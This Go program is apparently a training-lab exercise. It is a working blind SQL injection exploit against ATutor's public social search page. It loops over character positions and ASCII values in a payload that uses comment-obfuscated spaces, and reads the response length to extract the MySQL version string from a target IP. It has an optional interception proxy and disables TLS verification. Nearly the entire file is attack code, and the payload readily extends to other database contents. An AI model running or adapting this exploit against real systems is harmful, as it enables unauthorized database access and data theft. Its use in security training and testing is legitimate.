package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// Ex 3.5.2.1 - MySQL Version Extraction

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func printInfo(message string) {
	log.Println("[*] " + message)
}

func printSuccess(message string) {
	log.Println("\033[32m[+] \033[0m" + message)
}

func printFailure(message string) {
	log.Println("\033[31m[-] \033[0m" + message)
}

func sendGetRequest(requestURL string) int64 {
	// create our HTTP GET request
	req, err := http.NewRequest(http.MethodGet, requestURL, nil)
	if err != nil {
		log.Fatalln("[-] Failed to create HTTP request: ", err)
	}

	//printInfo("Sending HTTP request to: " + requestURL)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln("[-] Failed to send HTTP request: ", err)
	}
	defer resp.Body.Close()
	//printSuccess("Got HTTP response!")

	// get HTTP status code
	//printInfo(fmt.Sprintf("HTTP response status code: %d", resp.StatusCode))

	// get HTTP response content length
	//printInfo(fmt.Sprintf("HTTP response content length: %d", resp.ContentLength))

	// get HTTP response body
	//body, err := io.ReadAll(resp.Body)
	//if err != nil {
	//	log.Fatalln("[-] Failed to read HTTP response body: ", err)
	//}
	//printInfo("Response body: ")
	//bodyString := string(body)
	//fmt.Println(bodyString)

	// get HTTP response headers
	//printInfo("Response headers: ")
	//respHeaders := make(map[string]string)
	//for headerKey, headerValues := range resp.Header {
	//	fmt.Printf("\t%s = %s\n", headerKey, strings.Join(headerValues, ", "))
	//}

	//fmt.Println("")
	return resp.ContentLength
}

func sendSearchFriendsSQLi(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
		// do necessary URL manipulation
		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := sendGetRequest(requestURL)

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) != 2 {
		printFailure(fmt.Sprintf("usage: %s <target>", os.Args[0]))
		printFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := os.Args[1]

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{Transport: tr}

	printInfo("Extracting DB Version: ")
	for i := 1; i < 20; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23", i)
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLi(ip, sqliPayload))
		fmt.Print(extractedChar)
	}

	fmt.Println("")
	printSuccess("Done!")
}
